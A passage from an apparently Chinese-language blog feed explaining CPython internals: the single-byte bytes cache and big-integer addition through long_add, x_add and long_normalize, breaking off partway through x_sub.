class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (size == <span class="number">1</span> &amp;&amp; str != <span class="literal">NULL</span> &amp;&amp; (op = characters[*str &amp; UCHAR_MAX]) != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="meta">#<span class="keyword">ifdef</span> COUNT_ALLOCS</span></span><br><span class="line">    one_strings++;</span><br><span class="line">    <span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    Py_INCREF(op);</span><br><span class="line">    <span class="keyword">return</span> (PyObject *)op;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">op = (PyBytesObject *)_PyBytes_FromSize(size, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (op == <span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">if</span> (str == <span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">return</span> (PyObject *) op;</span><br><span class="line"></span><br><span class="line"><span class="built_in">memcpy</span>(op-&gt;ob_sval, str, size);</span><br><span class="line"><span class="comment">/* share short strings */</span></span><br><span class="line"><span class="keyword">if</span> (size == <span class="number">1</span>) &#123;</span><br><span class="line">    characters[*str &amp; UCHAR_MAX] = op;</span><br><span class="line">    Py_INCREF(op);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>one_strings</code>是用于计数当前单字节缓冲池中的使用情况。python初始该值为0，随着运行的进行，每当单字节缓冲池中的内容被使用，则该计数+1，以上图为例，假设标记出的几个被使用了，且其他为NULL，则<code>one_strings = 1</code> ，<strong>为什么？</strong>，先留着疑问，我们往下看：</p><p><code>op = characters[*str &amp; UCHAR_MAX]) != NULL</code></p><p>由于单字节缓冲池中的数量是0-255（映射为ascii码）当创建的是单字节，就尝试进行与操作<code>characters[*str &amp; UCHAR_MAX]</code>，取出相应位置</p><ul><li><p>当为空，则说明缓冲池中该对象为NULL，则申请相应对象，并修改缓冲池中相应指向该对象</p></li><li><p>不为空，则说明缓冲池中有该对象则取出使用，<code>one_strings++</code></p></li></ul><hr><h3 id="精彩面试题">精彩面试题</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; a1 = b<span class="number">&#x27;</span>a<span class="number">&#x27;</span></span><br><span class="line">&gt;&gt;&gt; a2 = b<span class="number">&#x27;</span>a<span class="number">&#x27;</span></span><br><span class="line">&gt;&gt;&gt; a1 is a2</span><br><span class="line">True</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; ab1 = b<span class="number">&#x27;</span>ab<span class="number">&#x27;</span></span><br><span class="line">&gt;&gt;&gt; ab2 = b<span class="number">&#x27;</span>ab<span class="number">&#x27;</span></span><br><span class="line">&gt;&gt;&gt; ab1 is ab2</span><br><span class="line">False</span><br></pre></td></tr></table></figure><p>导致上述现象存在的原因是由于python单字节缓冲池存在的原因</p>]]></content>
      
      
      <categories>
          
          <category> 源码 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python源码剖析 </tag>
            
            <tag> 源码 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python源码剖析No.5--大整数运算</title>
      <link href="/2022/05/17/python%E6%BA%90%E7%A0%81%E5%89%96%E6%9E%90-%E5%A4%A7%E6%95%B4%E6%95%B0%E8%BF%90%E7%AE%97/"/>
      <url>/2022/05/17/python%E6%BA%90%E7%A0%81%E5%89%96%E6%9E%90-%E5%A4%A7%E6%95%B4%E6%95%B0%E8%BF%90%E7%AE%97/</url>
      
        <content type="html"><![CDATA[<h3 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h3><p>上节我们分析了python实现大整数的方式（切分数值的绝对值存放到数组），如此一来对于大整数的运算会相应的变得复杂，本节探讨的就是python大整数运算的处理。</p><img src="/2022/05/17/python%E6%BA%90%E7%A0%81%E5%89%96%E6%9E%90-%E5%A4%A7%E6%95%B4%E6%95%B0%E8%BF%90%E7%AE%97/1.png" class=""><p>更多大整数实现细节，读者可以查看上节文章 -&gt; <a href="https://cvjark.github.io/2022/05/16/python%E6%BA%90%E7%A0%81%E5%89%96%E6%9E%90-%E6%B0%B8%E4%B8%8D%E6%BA%A2%E5%87%BA%E7%9A%84int%E5%AF%B9%E8%B1%A1/">Click me</a>。</p><br><h3 id="数值运算"><a href="#数值运算" class="headerlink" title="数值运算"></a>数值运算</h3><p>先前讨论python对象的相关内容，知道对象的行为由对象的类型决定的。因此，我们也将从整数类型对象中考察这个问题，整数<code>类型对象</code>对应<code>PyLong_Type</code>，定义位置&#x2F;Objects&#x2F;longobject.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">PyTypeObject PyLong_Type = &#123;</span><br><span class="line">    PyVarObject_HEAD_INIT(&amp;PyType_Type, <span class="number">0</span>)</span><br><span class="line">    <span class="string">&quot;int&quot;</span>,                                      <span class="comment">/* tp_name */</span></span><br><span class="line">    offsetof(PyLongObject, ob_digit),           <span class="comment">/* tp_basicsize */</span></span><br><span class="line">    <span class="keyword">sizeof</span>(digit),                              <span class="comment">/* tp_itemsize */</span></span><br><span class="line">    long_dealloc,                               <span class="comment">/* tp_dealloc */</span></span><br><span class="line">    <span class="number">0</span>,                                          <span class="comment">/* tp_print */</span></span><br><span class="line">    <span class="number">0</span>,                                          <span class="comment">/* tp_getattr */</span></span><br><span class="line">    <span class="number">0</span>,                                          <span class="comment">/* tp_setattr */</span></span><br><span class="line">    <span class="number">0</span>,                                          <span class="comment">/* tp_reserved */</span></span><br><span class="line">    long_to_decimal_string,                     <span class="comment">/* tp_repr */</span></span><br><span class="line">    &amp;long_as_number,                            <span class="comment">/* tp_as_number */</span></span><br><span class="line">    <span class="number">0</span>,                                          <span class="comment">/* tp_as_sequence */</span></span><br><span class="line">    <span class="number">0</span>,                                          <span class="comment">/* tp_as_mapping */</span></span><br><span class="line">    (hashfunc)long_hash,                        <span class="comment">/* tp_hash */</span></span><br><span class="line">    <span class="number">0</span>,                                          <span class="comment">/* tp_call */</span></span><br><span class="line">    long_to_decimal_string,                     <span class="comment">/* tp_str */</span></span><br><span class="line">    PyObject_GenericGetAttr,                    <span class="comment">/* tp_getattro */</span></span><br><span class="line">    <span class="number">0</span>,                                          <span class="comment">/* tp_setattro */</span></span><br><span class="line">    <span class="number">0</span>,                                          <span class="comment">/* tp_as_buffer */</span></span><br><span class="line">    Py_TPFLAGS_DEFAULT | Py_TPFLAGS_BASETYPE |</span><br><span class="line">        Py_TPFLAGS_LONG_SUBCLASS,               <span class="comment">/* tp_flags */</span></span><br><span class="line">    long_doc,                                   <span class="comment">/* tp_doc */</span></span><br><span class="line">    <span class="number">0</span>,                                          <span class="comment">/* tp_traverse */</span></span><br><span class="line">    <span class="number">0</span>,                                          <span class="comment">/* tp_clear */</span></span><br><span class="line">    long_richcompare,                           <span class="comment">/* tp_richcompare */</span></span><br><span class="line">    <span class="number">0</span>,                                          <span class="comment">/* tp_weaklistoffset */</span></span><br><span class="line">    <span class="number">0</span>,                                          <span class="comment">/* tp_iter */</span></span><br><span class="line">    <span class="number">0</span>,                                          <span class="comment">/* tp_iternext */</span></span><br><span class="line">    long_methods,                               <span class="comment">/* tp_methods */</span></span><br><span class="line">    <span class="number">0</span>,                                          <span class="comment">/* tp_members */</span></span><br><span class="line">    long_getset,                                <span class="comment">/* tp_getset */</span></span><br><span class="line">    <span class="number">0</span>,                                          <span class="comment">/* tp_base */</span></span><br><span class="line">    <span class="number">0</span>,                                          <span class="comment">/* tp_dict */</span></span><br><span class="line">    <span class="number">0</span>,                                          <span class="comment">/* tp_descr_get */</span></span><br><span class="line">    <span class="number">0</span>,                                          <span class="comment">/* tp_descr_set */</span></span><br><span class="line">    <span class="number">0</span>,                                          <span class="comment">/* tp_dictoffset */</span></span><br><span class="line">    <span class="number">0</span>,                                          <span class="comment">/* tp_init */</span></span><br><span class="line">    <span class="number">0</span>,                                          <span class="comment">/* tp_alloc */</span></span><br><span class="line">    long_new,                                   <span class="comment">/* tp_new */</span></span><br><span class="line">    PyObject_Del,                               <span class="comment">/* tp_free */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>可以看到数值型操作的<code>PyLong_Type.tp_as_number</code>字段不为空，说明整数对象支持数值型操作。</p><p>而<code>PyLong_Type.tp_as_sequence</code>字段以及<code>PyLong_Type.tp_as_mapping</code>字段为空，说明整数对象不支持这两个类型的操作。</p><p>跟进数值型操作<code>PyLong_Type.tp_as_number</code>字段的<code>long_as_number</code>，同文件下发现：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> PyNumberMethods long_as_number = &#123;</span><br><span class="line">    (binaryfunc)long_add,       <span class="comment">/*nb_add*/</span></span><br><span class="line">    (binaryfunc)long_sub,       <span class="comment">/*nb_subtract*/</span></span><br><span class="line">    (binaryfunc)long_mul,       <span class="comment">/*nb_multiply*/</span></span><br><span class="line">    long_mod,                   <span class="comment">/*nb_remainder*/</span></span><br><span class="line">    long_divmod,                <span class="comment">/*nb_divmod*/</span></span><br><span class="line">    long_pow,                   <span class="comment">/*nb_power*/</span></span><br><span class="line">    (unaryfunc)long_neg,        <span class="comment">/*nb_negative*/</span></span><br><span class="line">    (unaryfunc)long_long,       <span class="comment">/*tp_positive*/</span></span><br><span class="line">    (unaryfunc)long_abs,        <span class="comment">/*tp_absolute*/</span></span><br><span class="line">    (inquiry)long_bool,         <span class="comment">/*tp_bool*/</span></span><br><span class="line">    (unaryfunc)long_invert,     <span class="comment">/*nb_invert*/</span></span><br><span class="line">    long_lshift,                <span class="comment">/*nb_lshift*/</span></span><br><span class="line">    (binaryfunc)long_rshift,    <span class="comment">/*nb_rshift*/</span></span><br><span class="line">    long_and,                   <span class="comment">/*nb_and*/</span></span><br><span class="line">    long_xor,                   <span class="comment">/*nb_xor*/</span></span><br><span class="line">    long_or,                    <span class="comment">/*nb_or*/</span></span><br><span class="line">    long_long,                  <span class="comment">/*nb_int*/</span></span><br><span class="line">    <span class="number">0</span>,                          <span class="comment">/*nb_reserved*/</span></span><br><span class="line">    long_float,                 <span class="comment">/*nb_float*/</span></span><br><span class="line">    <span class="number">0</span>,                          <span class="comment">/* nb_inplace_add */</span></span><br><span class="line">    <span class="number">0</span>,                          <span class="comment">/* nb_inplace_subtract */</span></span><br><span class="line">    <span class="number">0</span>,                          <span class="comment">/* nb_inplace_multiply */</span></span><br><span class="line">    <span class="number">0</span>,                          <span class="comment">/* nb_inplace_remainder */</span></span><br><span class="line">    <span class="number">0</span>,                          <span class="comment">/* nb_inplace_power */</span></span><br><span class="line">    <span class="number">0</span>,                          <span class="comment">/* nb_inplace_lshift */</span></span><br><span class="line">    <span class="number">0</span>,                          <span class="comment">/* nb_inplace_rshift */</span></span><br><span class="line">    <span class="number">0</span>,                          <span class="comment">/* nb_inplace_and */</span></span><br><span class="line">    <span class="number">0</span>,                          <span class="comment">/* nb_inplace_xor */</span></span><br><span class="line">    <span class="number">0</span>,                          <span class="comment">/* nb_inplace_or */</span></span><br><span class="line">    long_div,                   <span class="comment">/* nb_floor_divide */</span></span><br><span class="line">    long_true_divide,           <span class="comment">/* nb_true_divide */</span></span><br><span class="line">    <span class="number">0</span>,                          <span class="comment">/* nb_inplace_floor_divide */</span></span><br><span class="line">    <span class="number">0</span>,                          <span class="comment">/* nb_inplace_true_divide */</span></span><br><span class="line">    long_long,                  <span class="comment">/* nb_index */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>不为空的字段说明整数对象提供了相应的操作函数。例如，<code>nb_add</code>，<code>nb_subtract</code>..等，现在我们可以结合前面的指示画出：</p><img src="/2022/05/17/python%E6%BA%90%E7%A0%81%E5%89%96%E6%9E%90-%E5%A4%A7%E6%95%B4%E6%95%B0%E8%BF%90%E7%AE%97/2.png" class=""><br><h4 id="数值加法–nb-add"><a href="#数值加法–nb-add" class="headerlink" title="数值加法–nb_add"></a>数值加法–nb_add</h4><p>整数对象的数值加法（<code>nb_add</code>）特化到整数对象下是<code>long_add</code>，代码位置&#x2F;Objects&#x2F;longobject.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> PyObject *</span><br><span class="line"><span class="title function_">long_add</span><span class="params">(PyLongObject *a, PyLongObject *b)</span></span><br><span class="line">&#123;</span><br><span class="line">    PyLongObject *z;</span><br><span class="line"></span><br><span class="line">    CHECK_BINOP(a, b);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (Py_ABS(Py_SIZE(a)) &lt;= <span class="number">1</span> &amp;&amp; Py_ABS(Py_SIZE(b)) &lt;= <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> PyLong_FromLong(MEDIUM_VALUE(a) + MEDIUM_VALUE(b));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (Py_SIZE(a) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (Py_SIZE(b) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            z = x_add(a, b);</span><br><span class="line">            <span class="keyword">if</span> (z != <span class="literal">NULL</span>) &#123;</span><br><span class="line">                <span class="comment">/* x_add received at least one multiple-digit int,</span></span><br><span class="line"><span class="comment">                   and thus z must be a multiple-digit int.</span></span><br><span class="line"><span class="comment">                   That also means z is not an element of</span></span><br><span class="line"><span class="comment">                   small_ints, so negating it in-place is safe. */</span></span><br><span class="line">                assert(Py_REFCNT(z) == <span class="number">1</span>);</span><br><span class="line">                Py_SIZE(z) = -(Py_SIZE(z));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            z = x_sub(b, a);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (Py_SIZE(b) &lt; <span class="number">0</span>)</span><br><span class="line">            z = x_sub(a, b);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            z = x_add(a, b);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> (PyObject *)z;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><p>第六行做了操作数的检查(大概是<code>long_add</code>只对整数对象进行加法，其他类型对象不适用)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> CHECK_BINOP(v,w)                                \</span></span><br><span class="line"><span class="meta">    do &#123;                                                \</span></span><br><span class="line"><span class="meta">        <span class="keyword">if</span> (!PyLong_Check(v) || !PyLong_Check(w))       \</span></span><br><span class="line"><span class="meta">            Py_RETURN_NOTIMPLEMENTED;                   \</span></span><br><span class="line"><span class="meta">    &#125; while(0)</span></span><br></pre></td></tr></table></figure></li><li><p>上述代码中频繁出现的<code>Py_Size</code>是个宏定义，位置在同文件下：</p><p><code>#define Py_SIZE(ob)             (((PyVarObject*)(ob))-&gt;ob_size)</code> 前面分析过<code>ob_size</code>字段存放的是用于记录<code>digit</code>数组中元素的个数</p></li><li><p><code>MEDIUN_VALUE</code>的定义也在同文件下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* convert a PyLong of size 1, 0 or -1 to an sdigit */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MEDIUM_VALUE(x) (assert(-1 &lt;= Py_SIZE(x) &amp;&amp; Py_SIZE(x) &lt;= 1),   \</span></span><br><span class="line"><span class="meta">         Py_SIZE(x) <span class="string">&lt; 0 ? -(sdigit)(x)-&gt;</span>ob_digit[0] :   \</span></span><br><span class="line"><span class="meta">             (Py_SIZE(x) == 0 ? (sdigit)0 :                             \</span></span><br><span class="line"><span class="meta">              (sdigit)(x)-&gt;ob_digit[0]))</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">if</span> PYLONG_BITS_IN_DIGIT == 30</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">int32_t</span> sdigit; <span class="comment">/* signed variant of digit */</span></span><br><span class="line"><span class="meta">#<span class="keyword">elif</span> PYLONG_BITS_IN_DIGIT == 15</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">short</span> sdigit;</span><br></pre></td></tr></table></figure><p>可以看到，<code>sdigit</code>只是C语言下的<code>int32_t</code> 和 <code>short</code>的别名，具体是哪个得参考<code>PYLONG_BITS_IN_DIGIT</code>的内容</p><p>到这里，就清楚<code>MEDIUM_VALUE</code>完成的是当指示<code>digit</code>数组长度的<code>ob_size</code>为1、0、-1时，此时仅仅使用C语言就足够运算了，因此转为C语言整数进行运算，运算结果使用<code>PyLong_FromLong</code>转为python对象</p></li><li><p>第11-22行，当a、b皆为负数（<code>ob_size</code>的符号表示正负。）时，使用<code>x_add</code>，进行运算。</p></li><li><p>第11行+第23-25行，当a为负数，b为正数，使用<code>x_sub</code>进行运算</p></li><li><p>第11行+第26-28行，当a为正数，b为负数，使用<code>x_sub</code>进行运算</p></li><li><p>第11行+第29-31行，当a为正数，b为正数，使用<code>x_add</code>进行运算</p></li></ul><p>可以看到，根据a、b符号进行了不同的操作，但最终回到两个关键的函数<code>x_add</code> &amp; <code>x_sub</code>，那么接着探讨这两个函数的处理过程</p><br><h4 id="x-add"><a href="#x-add" class="headerlink" title="x_add"></a>x_add</h4><p><code>x_add</code>定义位置在同文件下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Add the absolute values of two integers. */</span></span><br><span class="line"><span class="type">static</span> PyLongObject *</span><br><span class="line"><span class="title function_">x_add</span><span class="params">(PyLongObject *a, PyLongObject *b)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//记录二者长度的绝对值，代表了数值大小</span></span><br><span class="line">    Py_ssize_t size_a = Py_ABS(Py_SIZE(a)), size_b = Py_ABS(Py_SIZE(b));</span><br><span class="line">    PyLongObject *z;</span><br><span class="line">    Py_ssize_t i;</span><br><span class="line">    digit carry = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Ensure a is the larger of the two: */</span></span><br><span class="line">    <span class="keyword">if</span> (size_a &lt; size_b) &#123;</span><br><span class="line">        &#123; PyLongObject *temp = a; a = b; b = temp; &#125;</span><br><span class="line">        &#123; Py_ssize_t size_temp = size_a;</span><br><span class="line">            size_a = size_b;</span><br><span class="line">            size_b = size_temp; &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    z = _PyLong_New(size_a+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> (z == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; size_b; ++i) &#123;</span><br><span class="line">        carry += a-&gt;ob_digit[i] + b-&gt;ob_digit[i];</span><br><span class="line">        z-&gt;ob_digit[i] = carry &amp; PyLong_MASK;</span><br><span class="line">        carry &gt;&gt;= PyLong_SHIFT;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (; i &lt; size_a; ++i) &#123;</span><br><span class="line">        carry += a-&gt;ob_digit[i];</span><br><span class="line">        z-&gt;ob_digit[i] = carry &amp; PyLong_MASK;</span><br><span class="line">        carry &gt;&gt;= PyLong_SHIFT;</span><br><span class="line">    &#125;</span><br><span class="line">    z-&gt;ob_digit[i] = carry;</span><br><span class="line">    <span class="keyword">return</span> long_normalize(z);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><p>第1行，注释中表明该函数完成的是两个整数对象绝对值相加</p></li><li><p>第5行，比较a、b整数对象存放数值的<code>digit</code>数组的长度（忽略正负），分别存放到<code>size_a</code>  <code>size_b</code>中</p></li><li><p>第11-16行，对比<code>size_a</code>  <code>size_b</code>，保证a为二者长度较大的一个，否则交换a、b对象</p></li><li><p>第17行，<code>_PyLong_New</code>创建新的整数对象z，<code>digit</code>数组长度取a+1（用于潜在进位保留）</p></li><li><p>第21-24行，<code>ob_digit</code>每一个元素表示的范围<code>2 ** 30</code>当超过则会溢出，因此<code>carry</code>保存的进位信息</p><p>这里需要解决22行中<code>z-&gt;ob_digit[i] = carry &amp; PyLong_MASK;</code>，跟踪<code>PyLong_MASK</code>在同文件下找到定义</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> PyLong_MASK     ((digit)(PyLong_BASE - 1))</span></span><br><span class="line"><span class="comment">//跟进PyLong_BASE，发现</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PyLong_BASE     ((digit)1 &lt;&lt; PyLong_SHIFT)</span></span><br><span class="line"><span class="comment">//再跟进PyLong_SHIFT，发现</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PyLong_SHIFT    15</span></span><br></pre></td></tr></table></figure><p>大致完成：第21行<code>carry += a-&gt;ob_digit[i] + b-&gt;ob_digit[i]</code>并做了相同的移位操作，第22行位置<code>z-&gt;ob_digit[i]</code>中保留非进位部分，第23行，将进位<code>carry</code>右移参与下一个digit数组的运算</p><blockquote><p>注：<code>PyLong_MASK</code>将1进行左移<code>PyLong_SHIFT</code>位（15）得到<code> 1000 0000 0000 0000</code>，将这个值-1，得到<code>PyLong_MASK = 0111 1111 1111 1111</code>。</p></blockquote></li><li><p>第25-29行，这块处理的是a中比b高出的部分。，行为同第21-24行一致。</p></li><li><p>第30行，将z对象<code>digit</code>数组最高位保存进位。</p></li><li><p>第31行，调用<code>long_normalize</code>对z对象进行处理。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> PyLongObject *</span><br><span class="line"><span class="title function_">long_normalize</span><span class="params">(PyLongObject *v)</span></span><br><span class="line">&#123;</span><br><span class="line">    Py_ssize_t j = Py_ABS(Py_SIZE(v));</span><br><span class="line">    Py_ssize_t i = j;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (i &gt; <span class="number">0</span> &amp;&amp; v-&gt;ob_digit[i<span class="number">-1</span>] == <span class="number">0</span>)</span><br><span class="line">        --i;</span><br><span class="line">    <span class="keyword">if</span> (i != j)</span><br><span class="line">        Py_SIZE(v) = (Py_SIZE(v) &lt; <span class="number">0</span>) ? -(i) : i;</span><br><span class="line">    <span class="keyword">return</span> v;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>取出对象高位为0 的部分，并完成<code>ob_size</code>的设置</p></li></ul><h6 id="实例演示过程"><a href="#实例演示过程" class="headerlink" title="实例演示过程"></a>实例演示过程</h6><img src="/2022/05/17/python%E6%BA%90%E7%A0%81%E5%89%96%E6%9E%90-%E5%A4%A7%E6%95%B4%E6%95%B0%E8%BF%90%E7%AE%97/3.png" class=""><br><h4 id="x-sub"><a href="#x-sub" class="headerlink" title="x_sub"></a>x_sub</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> PyLongObject *</span><br><span class="line"><span class="title function_">x_sub</span><span class="params">(PyLongObject *a, PyLongObject *b)</span></span><br><span class="line">&#123;</span><br><span class="line">    Py_ssize_t size_a = Py_ABS(Py_SIZE(a)), size_b = Py_ABS(Py_SIZE(b));</span><br><span class="line">    PyLongObject *z;</span><br><span class="line">    Py_ssize_t i;</span><br><span class="line">    <span class="type">int</span> sign = <span class="number">1</span>;</span><br><span class="line">    digit borrow = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Ensure a is the larger of the two: */</span></span><br><span class="line">    <span class="keyword">if</span> (size_a &lt; size_b) &#123;</span><br><span class="line">        sign = <span class="number">-1</span>;</span><br><span class="line">        &#123; PyLongObject *temp = a; a = b; b = temp; &#125;</span><br><span class="line">        &#123; Py_ssize_t size_temp = size_a;</span><br><span class="line">            size_a = size_b;</span><br><span class="line">            size_b = size_temp; &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (size_a == size_b) &#123;</span><br><span class="line">        <span class="comment">/* Find highest digit where a and b differ: */</span></span><br><span class="line">        i = size_a;</span><br><span class="line">        <span class="keyword">while</span> (--i &gt;= <span class="number">0</span> &amp;&amp; 